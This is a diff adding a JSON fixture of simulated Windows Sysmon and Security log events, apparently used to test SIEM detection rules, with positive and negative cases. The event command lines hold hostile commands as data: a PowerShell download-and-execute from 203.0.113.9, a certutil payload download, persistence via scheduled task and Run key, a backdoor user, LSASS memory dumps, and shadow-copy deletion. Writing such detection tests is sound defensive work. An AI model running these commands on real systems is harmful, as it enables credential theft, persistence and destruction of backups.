@@ -1,0 +1,151 @@
+[
+  {
+    "id": "DL-WIN-001",
+    "description": "PowerShell encoded command",
+    "log_format": "eventchannel",
+    "events": [
+      "{\"win\": {\"system\": {\"providerName\": \"Microsoft-Windows-Sysmon\", \"eventID\": \"1\", \"level\": \"4\", \"channel\": \"Microsoft-Windows-Sysmon/Operational\", \"computer\": \"WS01.lab.local\", \"severityValue\": \"INFORMATION\", \"systemTime\": \"2026-11-17T10:00:00.000Z\"}, \"eventdata\": {\"utcTime\": \"2026-11-17 10:00:00.000\", \"image\": \"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\", \"commandLine\": \"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe -NoP -W Hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA\", \"parentImage\": \"C:\\\\Windows\\\\explorer.exe\", \"user\": \"LAB\\\\bob\", \"processId\": \"4321\", \"parentProcessId\": \"1111\", \"hashes\": \"SHA256=0F1E2D3C4B5A69788796A5B4C3D2E1F00F1E2D3C4B5A69788796A5B4C3D2E1F0\"}}}"
+    ],
+    "expect_rule": "100110",
+    "location": "EventChannel"
+  },
+  {
+    "id": "DL-WIN-002",
+    "description": "WINWORD spawning powershell",
+    "log_format": "eventchannel",
+    "events": [
+      "{\"win\": {\"system\": {\"providerName\": \"Microsoft-Windows-Sysmon\", \"eventID\": \"1\", \"level\": \"4\", \"channel\": \"Microsoft-Windows-Sysmon/Operational\", \"computer\": \"WS01.lab.local\", \"severityValue\": \"INFORMATION\", \"systemTime\": \"2026-11-17T10:00:00.000Z\"}, \"eventdata\": {\"utcTime\": \"2026-11-17 10:00:00.000\", \"image\": \"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\", \"commandLine\": \"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe -c IEX(iwr http://203.0.113.9/a.ps1)\", \"parentImage\": \"C:\\\\Program Files\\\\Microsoft Office\\\\root\\\\Office16\\\\WINWORD.EXE\", \"user\": \"LAB\\\\bob\", \"processId\": \"4321\", \"parentProcessId\": \"1111\", \"hashes\": \"SHA256=0F1E2D3C4B5A69788796A5B4C3D2E1F00F1E2D3C4B5A69788796A5B4C3D2E1F0\"}}}"
+    ],
+    "expect_rule": "100111",
+    "location": "EventChannel"
+  },
+  {
+    "id": "DL-WIN-003",
+    "description": "certutil download",
+    "log_format": "eventchannel",
+    "events": [
+      "{\"win\": {\"system\": {\"providerName\": \"Microsoft-Windows-Sysmon\", \"eventID\": \"1\", \"level\": \"4\", \"channel\": \"Microsoft-Windows-Sysmon/Operational\", \"computer\": \"WS01.lab.local\", \"severityValue\": \"INFORMATION\", \"systemTime\": \"2026-11-17T10:00:00.000Z\"}, \"eventdata\": {\"utcTime\": \"2026-11-17 10:00:00.000\", \"image\": \"C:\\\\Windows\\\\System32\\\\certutil.exe\", \"commandLine\": \"certutil.exe -urlcache -split -f http://203.0.113.9/payload.exe C:\\\\Users\\\\Public\\\\p.exe\", \"parentImage\": \"C:\\\\Windows\\\\System32\\\\cmd.exe\", \"user\": \"LAB\\\\bob\", \"processId\": \"4321\", \"parentProcessId\": \"1111\", \"hashes\": \"SHA256=0F1E2D3C4B5A69788796A5B4C3D2E1F00F1E2D3C4B5A69788796A5B4C3D2E1F0\"}}}"
+    ],
+    "expect_rule": "100112",
+    "location": "EventChannel"
+  },
+  {
+    "id": "DL-WIN-004",
+    "description": "schtasks create",
+    "log_format": "eventchannel",
+    "events": [
+      "{\"win\": {\"system\": {\"providerName\": \"Microsoft-Windows-Sysmon\", \"eventID\": \"1\", \"level\": \"4\", \"channel\": \"Microsoft-Windows-Sysmon/Operational\", \"computer\": \"WS01.lab.local\", \"severityValue\": \"INFORMATION\", \"systemTime\": \"2026-11-17T10:00:00.000Z\"}, \"eventdata\": {\"utcTime\": \"2026-11-17 10:00:00.000\", \"image\": \"C:\\\\Windows\\\\System32\\\\schtasks.exe\", \"commandLine\": \"schtasks /create /sc onlogon /tn \\\"Updater\\\" /tr \\\"C:\\\\Users\\\\Public\\\\p.exe\\\"\", \"parentImage\": \"C:\\\\Windows\\\\System32\\\\cmd.exe\", \"user\": \"LAB\\\\bob\", \"processId\": \"4321\", \"parentProcessId\": \"1111\", \"hashes\": \"SHA256=0F1E2D3C4B5A69788796A5B4C3D2E1F00F1E2D3C4B5A69788796A5B4C3D2E1F0\"}}}"
+    ],
+    "expect_rule": "100113",
+    "location": "EventChannel"
+  },
+  {
+    "id": "DL-WIN-005",
+    "description": "Registry Run key persistence",
+    "log_format": "eventchannel",
+    "events": [
+      "{\"win\": {\"system\": {\"providerName\": \"Microsoft-Windows-Sysmon\", \"eventID\": \"13\", \"level\": \"4\", \"channel\": \"Microsoft-Windows-Sysmon/Operational\", \"computer\": \"WS01.lab.local\", \"severityValue\": \"INFORMATION\", \"systemTime\": \"2026-11-17T10:00:00.000Z\"}, \"eventdata\": {\"eventType\": \"SetValue\", \"image\": \"C:\\\\Users\\\\Public\\\\p.exe\", \"targetObject\": \"HKU\\\\S-1-5-21-1-1-1-1001\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\\Updater\", \"details\": \"C:\\\\Users\\\\Public\\\\p.exe\"}}}"
+    ],
+    "expect_rule": "100114",
+    "location": "EventChannel"
+  },
+  {
+    "id": "DL-WIN-006",
+    "description": "net user /add",
+    "log_format": "eventchannel",
+    "events": [
+      "{\"win\": {\"system\": {\"providerName\": \"Microsoft-Windows-Sysmon\", \"eventID\": \"1\", \"level\": \"4\", \"channel\": \"Microsoft-Windows-Sysmon/Operational\", \"computer\": \"WS01.lab.local\", \"severityValue\": \"INFORMATION\", \"systemTime\": \"2026-11-17T10:00:00.000Z\"}, \"eventdata\": {\"utcTime\": \"2026-11-17 10:00:00.000\", \"image\": \"C:\\\\Windows\\\\System32\\\\net.exe\", \"commandLine\": \"net user backdoor P@ssw0rd123 /add\", \"parentImage\": \"C:\\\\Windows\\\\System32\\\\cmd.exe\", \"user\": \"LAB\\\\bob\", \"processId\": \"4321\", \"parentProcessId\": \"1111\", \"hashes\": \"SHA256=0F1E2D3C4B5A69788796A5B4C3D2E1F00F1E2D3C4B5A69788796A5B4C3D2E1F0\"}}}"
+    ],
+    "expect_rule": "100115",
+    "location": "EventChannel"
+  },
+  {
+    "id": "DL-WIN-007",
+    "description": "procdump of lsass",
+    "log_format": "eventchannel",
+    "events": [
+      "{\"win\": {\"system\": {\"providerName\": \"Microsoft-Windows-Sysmon\", \"eventID\": \"1\", \"level\": \"4\", \"channel\": \"Microsoft-Windows-Sysmon/Operational\", \"computer\": \"WS01.lab.local\", \"severityValue\": \"INFORMATION\", \"systemTime\": \"2026-11-17T10:00:00.000Z\"}, \"eventdata\": {\"utcTime\": \"2026-11-17 10:00:00.000\", \"image\": \"C:\\\\Temp\\\\procdump64.exe\", \"commandLine\": \"procdump64.exe -accepteula -ma lsass.exe C:\\\\Temp\\\\l.dmp\", \"parentImage\": \"C:\\\\Windows\\\\System32\\\\cmd.exe\", \"user\": \"LAB\\\\bob\", \"processId\": \"4321\", \"parentProcessId\": \"1111\", \"hashes\": \"SHA256=0F1E2D3C4B5A69788796A5B4C3D2E1F00F1E2D3C4B5A69788796A5B4C3D2E1F0\"}}}"
+    ],
+    "expect_rule": "100116",
+    "location": "EventChannel"
+  },
+  {
+    "id": "DL-WIN-007b",
+    "description": "comsvcs MiniDump of lsass",
+    "log_format": "eventchannel",
+    "events": [
+      "{\"win\": {\"system\": {\"providerName\": \"Microsoft-Windows-Sysmon\", \"eventID\": \"1\", \"level\": \"4\", \"channel\": \"Microsoft-Windows-Sysmon/Operational\", \"computer\": \"WS01.lab.local\", \"severityValue\": \"INFORMATION\", \"systemTime\": \"2026-11-17T10:00:00.000Z\"}, \"eventdata\": {\"utcTime\": \"2026-11-17 10:00:00.000\", \"image\": \"C:\\\\Windows\\\\System32\\\\rundll32.exe\", \"commandLine\": \"rundll32.exe C:\\\\Windows\\\\System32\\\\comsvcs.dll, MiniDump 624 C:\\\\Temp\\\\l.dmp full\", \"parentImage\": \"C:\\\\Windows\\\\System32\\\\cmd.exe\", \"user\": \"LAB\\\\bob\", \"processId\": \"4321\", \"parentProcessId\": \"1111\", \"hashes\": \"SHA256=0F1E2D3C4B5A69788796A5B4C3D2E1F00F1E2D3C4B5A69788796A5B4C3D2E1F0\"}}}"
+    ],
+    "expect_rule": "100116",
+    "location": "EventChannel"
+  },
+  {
+    "id": "DL-WIN-008",
+    "description": "Windows logon success after failures from same IP",
+    "log_format": "eventchannel",
+    "events": [
+      "{\"win\": {\"system\": {\"providerName\": \"Microsoft-Windows-Security-Auditing\", \"eventID\": \"4625\", \"channel\": \"Security\", \"computer\": \"DC01.lab.local\", \"severityValue\": \"AUDIT_FAILURE\", \"systemTime\": \"2026-11-17T10:00:00.000Z\"}, \"eventdata\": {\"targetUserName\": \"administrator\", \"ipAddress\": \"192.168.56.66\", \"logonType\": \"3\", \"workstationName\": \"KALI\"}}}",
+      "{\"win\": {\"system\": {\"providerName\": \"Microsoft-Windows-Security-Auditing\", \"eventID\": \"4625\", \"channel\": \"Security\", \"computer\": \"DC01.lab.local\", \"severityValue\": \"AUDIT_FAILURE\", \"systemTime\": \"2026-11-17T10:00:00.000Z\"}, \"eventdata\": {\"targetUserName\": \"administrator\", \"ipAddress\": \"192.168.56.66\", \"logonType\": \"3\", \"workstationName\": \"KALI\"}}}",
+      "{\"win\": {\"system\": {\"providerName\": \"Microsoft-Windows-Security-Auditing\", \"eventID\": \"4625\", \"channel\": \"Security\", \"computer\": \"DC01.lab.local\", \"severityValue\": \"AUDIT_FAILURE\", \"systemTime\": \"2026-11-17T10:00:00.000Z\"}, \"eventdata\": {\"targetUserName\": \"administrator\", \"ipAddress\": \"192.168.56.66\", \"logonType\": \"3\", \"workstationName\": \"KALI\"}}}",
+      "{\"win\": {\"system\": {\"providerName\": \"Microsoft-Windows-Security-Auditing\", \"eventID\": \"4625\", \"channel\": \"Security\", \"computer\": \"DC01.lab.local\", \"severityValue\": \"AUDIT_FAILURE\", \"systemTime\": \"2026-11-17T10:00:00.000Z\"}, \"eventdata\": {\"targetUserName\": \"administrator\", \"ipAddress\": \"192.168.56.66\", \"logonType\": \"3\", \"workstationName\": \"KALI\"}}}",
+      "{\"win\": {\"system\": {\"providerName\": \"Microsoft-Windows-Security-Auditing\", \"eventID\": \"4625\", \"channel\": \"Security\", \"computer\": \"DC01.lab.local\", \"severityValue\": \"AUDIT_FAILURE\", \"systemTime\": \"2026-11-17T10:00:00.000Z\"}, \"eventdata\": {\"targetUserName\": \"administrator\", \"ipAddress\": \"192.168.56.66\", \"logonType\": \"3\", \"workstationName\": \"KALI\"}}}",
+      "{\"win\": {\"system\": {\"providerName\": \"Microsoft-Windows-Security-Auditing\", \"eventID\": \"4625\", \"channel\": \"Security\", \"computer\": \"DC01.lab.local\", \"severityValue\": \"AUDIT_FAILURE\", \"systemTime\": \"2026-11-17T10:00:00.000Z\"}, \"eventdata\": {\"targetUserName\": \"administrator\", \"ipAddress\": \"192.168.56.66\", \"logonType\": \"3\", \"workstationName\": \"KALI\"}}}",
+      "{\"win\": {\"system\": {\"providerName\": \"Microsoft-Windows-Security-Auditing\", \"eventID\": \"4625\", \"channel\": \"Security\", \"computer\": \"DC01.lab.local\", \"severityValue\": \"AUDIT_FAILURE\", \"systemTime\": \"2026-11-17T10:00:00.000Z\"}, \"eventdata\": {\"targetUserName\": \"administrator\", \"ipAddress\": \"192.168.56.66\", \"logonType\": \"3\", \"workstationName\": \"KALI\"}}}",
+      "{\"win\": {\"system\": {\"providerName\": \"Microsoft-Windows-Security-Auditing\", \"eventID\": \"4624\", \"channel\": \"Security\", \"computer\": \"DC01.lab.local\", \"severityValue\": \"AUDIT_SUCCESS\", \"systemTime\": \"2026-11-17T10:00:00.000Z\"}, \"eventdata\": {\"targetUserName\": \"administrator\", \"ipAddress\": \"192.168.56.66\", \"logonType\": \"3\", \"workstationName\": \"KALI\"}}}"
+    ],
+    "expect_rule": "100117",
+    "expect_on_last": true,
+    "location": "EventChannel"
+  },
+  {
+    "id": "DL-WIN-009",
+    "description": "Discovery burst (whoami, systeminfo, net group, nltest)",
+    "log_format": "eventchannel",
+    "events": [
+      "{\"win\": {\"system\": {\"providerName\": \"Microsoft-Windows-Sysmon\", \"eventID\": \"1\", \"level\": \"4\", \"channel\": \"Microsoft-Windows-Sysmon/Operational\", \"computer\": \"WS02.lab.local\", \"severityValue\": \"INFORMATION\", \"systemTime\": \"2026-11-17T10:00:00.000Z\"}, \"eventdata\": {\"utcTime\": \"2026-11-17 10:00:00.000\", \"image\": \"C:\\\\Windows\\\\System32\\\\whoami.exe\", \"commandLine\": \"whoami /all\", \"parentImage\": \"C:\\\\Windows\\\\System32\\\\cmd.exe\", \"user\": \"LAB\\\\bob\", \"processId\": \"4321\", \"parentProcessId\": \"1111\", \"hashes\": \"SHA256=0F1E2D3C4B5A69788796A5B4C3D2E1F00F1E2D3C4B5A69788796A5B4C3D2E1F0\"}}}",
+      "{\"win\": {\"system\": {\"providerName\": \"Microsoft-Windows-Sysmon\", \"eventID\": \"1\", \"level\": \"4\", \"channel\": \"Microsoft-Windows-Sysmon/Operational\", \"computer\": \"WS02.lab.local\", \"severityValue\": \"INFORMATION\", \"systemTime\": \"2026-11-17T10:00:00.000Z\"}, \"eventdata\": {\"utcTime\": \"2026-11-17 10:00:00.000\", \"image\": \"C:\\\\Windows\\\\System32\\\\systeminfo.exe\", \"commandLine\": \"systeminfo\", \"parentImage\": \"C:\\\\Windows\\\\System32\\\\cmd.exe\", \"user\": \"LAB\\\\bob\", \"processId\": \"4321\", \"parentProcessId\": \"1111\", \"hashes\": \"SHA256=0F1E2D3C4B5A69788796A5B4C3D2E1F00F1E2D3C4B5A69788796A5B4C3D2E1F0\"}}}",
+      "{\"win\": {\"system\": {\"providerName\": \"Microsoft-Windows-Sysmon\", \"eventID\": \"1\", \"level\": \"4\", \"channel\": \"Microsoft-Windows-Sysmon/Operational\", \"computer\": \"WS02.lab.local\", \"severityValue\": \"INFORMATION\", \"systemTime\": \"2026-11-17T10:00:00.000Z\"}, \"eventdata\": {\"utcTime\": \"2026-11-17 10:00:00.000\", \"image\": \"C:\\\\Windows\\\\System32\\\\net.exe\", \"commandLine\": \"net group \\\"domain admins\\\" /domain\", \"parentImage\": \"C:\\\\Windows\\\\System32\\\\cmd.exe\", \"user\": \"LAB\\\\bob\", \"processId\": \"4321\", \"parentProcessId\": \"1111\", \"hashes\": \"SHA256=0F1E2D3C4B5A69788796A5B4C3D2E1F00F1E2D3C4B5A69788796A5B4C3D2E1F0\"}}}",
+      "{\"win\": {\"system\": {\"providerName\": \"Microsoft-Windows-Sysmon\", \"eventID\": \"1\", \"level\": \"4\", \"channel\": \"Microsoft-Windows-Sysmon/Operational\", \"computer\": \"WS02.lab.local\", \"severityValue\": \"INFORMATION\", \"systemTime\": \"2026-11-17T10:00:00.000Z\"}, \"eventdata\": {\"utcTime\": \"2026-11-17 10:00:00.000\", \"image\": \"C:\\\\Windows\\\\System32\\\\nltest.exe\", \"commandLine\": \"nltest /dclist:lab.local\", \"parentImage\": \"C:\\\\Windows\\\\System32\\\\cmd.exe\", \"user\": \"LAB\\\\bob\", \"processId\": \"4321\", \"parentProcessId\": \"1111\", \"hashes\": \"SHA256=0F1E2D3C4B5A69788796A5B4C3D2E1F00F1E2D3C4B5A69788796A5B4C3D2E1F0\"}}}",
+      "{\"win\": {\"system\": {\"providerName\": \"Microsoft-Windows-Sysmon\", \"eventID\": \"1\", \"level\": \"4\", \"channel\": \"Microsoft-Windows-Sysmon/Operational\", \"computer\": \"WS02.lab.local\", \"severityValue\": \"INFORMATION\", \"systemTime\": \"2026-11-17T10:00:00.000Z\"}, \"eventdata\": {\"utcTime\": \"2026-11-17 10:00:00.000\", \"image\": \"C:\\\\Windows\\\\System32\\\\ipconfig.exe\", \"commandLine\": \"ipconfig /all\", \"parentImage\": \"C:\\\\Windows\\\\System32\\\\cmd.exe\", \"user\": \"LAB\\\\bob\", \"processId\": \"4321\", \"parentProcessId\": \"1111\", \"hashes\": \"SHA256=0F1E2D3C4B5A69788796A5B4C3D2E1F00F1E2D3C4B5A69788796A5B4C3D2E1F0\"}}}"
+    ],
+    "expect_rule": "100119",
+    "location": "EventChannel"
+  },
+  {
+    "id": "DL-WIN-010",
+    "description": "vssadmin delete shadows",
+    "log_format": "eventchannel",
+    "events": [
+      "{\"win\": {\"system\": {\"providerName\": \"Microsoft-Windows-Sysmon\", \"eventID\": \"1\", \"level\": \"4\", \"channel\": \"Microsoft-Windows-Sysmon/Operational\", \"computer\": \"WS01.lab.local\", \"severityValue\": \"INFORMATION\", \"systemTime\": \"2026-11-17T10:00:00.000Z\"}, \"eventdata\": {\"utcTime\": \"2026-11-17 10:00:00.000\", \"image\": \"C:\\\\Windows\\\\System32\\\\vssadmin.exe\", \"commandLine\": \"vssadmin.exe delete shadows /all /quiet\", \"parentImage\": \"C:\\\\Windows\\\\System32\\\\cmd.exe\", \"user\": \"LAB\\\\bob\", \"processId\": \"4321\", \"parentProcessId\": \"1111\", \"hashes\": \"SHA256=0F1E2D3C4B5A69788796A5B4C3D2E1F00F1E2D3C4B5A69788796A5B4C3D2E1F0\"}}}"
+    ],
+    "expect_rule": "100120",
+    "location": "EventChannel"
+  },
+  {
+    "id": "NEG-WIN-001",
+    "description": "Normal PowerShell must NOT trigger DL-WIN-001",
+    "log_format": "eventchannel",
+    "events": [
+      "{\"win\": {\"system\": {\"providerName\": \"Microsoft-Windows-Sysmon\", \"eventID\": \"1\", \"level\": \"4\", \"channel\": \"Microsoft-Windows-Sysmon/Operational\", \"computer\": \"WS01.lab.local\", \"severityValue\": \"INFORMATION\", \"systemTime\": \"2026-11-17T10:00:00.000Z\"}, \"eventdata\": {\"utcTime\": \"2026-11-17 10:00:00.000\", \"image\": \"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\", \"commandLine\": \"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe -NoProfile -File C:\\\\Scripts\\\\backup.ps1\", \"parentImage\": \"C:\\\\Windows\\\\explorer.exe\", \"user\": \"LAB\\\\bob\", \"processId\": \"4321\", \"parentProcessId\": \"1111\", \"hashes\": \"SHA256=0F1E2D3C4B5A69788796A5B4C3D2E1F00F1E2D3C4B5A69788796A5B4C3D2E1F0\"}}}"
+    ],
+    "expect_not_rule": "100110",
+    "location": "EventChannel"
+  },
+  {
+    "id": "NEG-WIN-008",
+    "description": "Logon success from a DIFFERENT IP must NOT trigger DL-WIN-008",
+    "log_format": "eventchannel",
+    "events": [
+      "{\"win\": {\"system\": {\"providerName\": \"Microsoft-Windows-Security-Auditing\", \"eventID\": \"4625\", \"channel\": \"Security\", \"computer\": \"DC01.lab.local\", \"severityValue\": \"AUDIT_FAILURE\", \"systemTime\": \"2026-11-17T10:00:00.000Z\"}, \"eventdata\": {\"targetUserName\": \"administrator\", \"ipAddress\": \"192.168.56.66\", \"logonType\": \"3\", \"workstationName\": \"KALI\"}}}",
+      "{\"win\": {\"system\": {\"providerName\": \"Microsoft-Windows-Security-Auditing\", \"eventID\": \"4625\", \"channel\": \"Security\", \"computer\": \"DC01.lab.local\", \"severityValue\": \"AUDIT_FAILURE\", \"systemTime\": \"2026-11-17T10:00:00.000Z\"}, \"eventdata\": {\"targetUserName\": \"administrator\", \"ipAddress\": \"192.168.56.66\", \"logonType\": \"3\", \"workstationName\": \"KALI\"}}}",
+      "{\"win\": {\"system\": {\"providerName\": \"Microsoft-Windows-Security-Auditing\", \"eventID\": \"4625\", \"channel\": \"Security\", \"computer\": \"DC01.lab.local\", \"severityValue\": \"AUDIT_FAILURE\", \"systemTime\": \"2026-11-17T10:00:00.000Z\"}, \"eventdata\": {\"targetUserName\": \"administrator\", \"ipAddress\": \"192.168.56.66\", \"logonType\": \"3\", \"workstationName\": \"KALI\"}}}",
+      "{\"win\": {\"system\": {\"providerName\": \"Microsoft-Windows-Security-Auditing\", \"eventID\": \"4625\", \"channel\": \"Security\", \"computer\": \"DC01.lab.local\", \"severityValue\": \"AUDIT_FAILURE\", \"systemTime\": \"2026-11-17T10:00:00.000Z\"}, \"eventdata\": {\"targetUserName\": \"administrator\", \"ipAddress\": \"192.168.56.66\", \"logonType\": \"3\", \"workstationName\": \"KALI\"}}}",
+      "{\"win\": {\"system\": {\"providerName\": \"Microsoft-Windows-Security-Auditing\", \"eventID\": \"4625\", \"channel\": \"Security\", \"computer\": \"DC01.lab.local\", \"severityValue\": \"AUDIT_FAILURE\", \"systemTime\": \"2026-11-17T10:00:00.000Z\"}, \"eventdata\": {\"targetUserName\": \"administrator\", \"ipAddress\": \"192.168.56.66\", \"logonType\": \"3\", \"workstationName\": \"KALI\"}}}",
+      "{\"win\": {\"system\": {\"providerName\": \"Microsoft-Windows-Security-Auditing\", \"eventID\": \"4625\", \"channel\": \"Security\", \"computer\": \"DC01.lab.local\", \"severityValue\": \"AUDIT_FAILURE\", \"systemTime\": \"2026-11-17T10:00:00.000Z\"}, \"eventdata\": {\"targetUserName\": \"administrator\", \"ipAddress\": \"192.168.56.66\", \"logonType\": \"3\", \"workstationName\": \"KALI\"}}}",
+      "{\"win\": {\"system\": {\"providerName\": \"Microsoft-Windows-Security-Auditing\", \"eventID\": \"4625\", \"channel\": \"Security\", \"computer\": \"DC01.lab.local\", \"severityValue\": \"AUDIT_FAILURE\", \"systemTime\": \"2026-11-17T10:00:00.000Z\"}, \"eventdata\": {\"targetUserName\": \"administrator\", \"ipAddress\": \"192.168.56.66\", \"logonType\": \"3\", \"workstationName\": \"KALI\"}}}",
+      "{\"win\": {\"system\": {\"providerName\": \"Microsoft-Windows-Security-Auditing\", \"eventID\": \"4624\", \"channel\": \"Security\", \"computer\": \"DC01.lab.local\", \"severityValue\": \"AUDIT_SUCCESS\", \"systemTime\": \"2026-11-17T10:00:00.000Z\"}, \"eventdata\": {\"targetUserName\": \"administrator\", \"ipAddress\": \"192.168.56.20\", \"logonType\": \"3\", \"workstationName\": \"KALI\"}}}"
+    ],
+    "expect_not_rule": "100117",
+    "location": "EventChannel"
+  }
+]
